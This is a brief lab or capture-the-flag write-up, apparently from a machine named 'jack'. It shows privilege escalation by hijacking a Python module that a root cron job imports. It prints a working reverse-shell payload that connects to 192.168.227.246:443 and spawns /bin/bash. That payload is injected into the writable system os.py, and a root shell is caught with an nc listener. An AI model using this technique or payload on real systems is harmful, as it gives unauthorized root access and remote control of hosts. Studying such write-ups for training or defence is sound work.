
When we identified that an script is running as cron automatically with root permissions, we can check the modules which are imported for write permissions. If we have write permissions, we can embedd malicious scripts inside in order to gain RCE, since the script is automatically executing the module as root.

I identified an interesting python script which get's executed with root permissions.

```
jack@jack:/opt/statuscheck$ cat checker.py 
import os

os.system("/usr/bin/curl -s -I http://127.0.0.1 >> /opt/statuscheck/output.log")
```

The python module "os" is being utilized, I'm checking which write permissions user "jack" has.

```
find / -writable 2>/dev/null | grep -v "^/proc\|^/sys\|^/run"
/usr/lib/python2.7/os.py
```

We have write permissions on the python os module. Let's inject an bash shell reverse shell script inside it. The script should be executed automatically since it's running as cronjob & then we should gain RCE.

Inserted the following payload into os.py

```
import socket
import pty
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.227.246",443))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)    
pty.spawn("/bin/bash")
```

Started up listener on port 443

```
nc -lvnp 443
```

Gained RCE as user "root".

```
nc -lvnp 443                             
listening on [any] 443 ...
connect to [192.168.227.246] from (UNKNOWN) [10.114.184.13] 47210
root@jack:~#
```
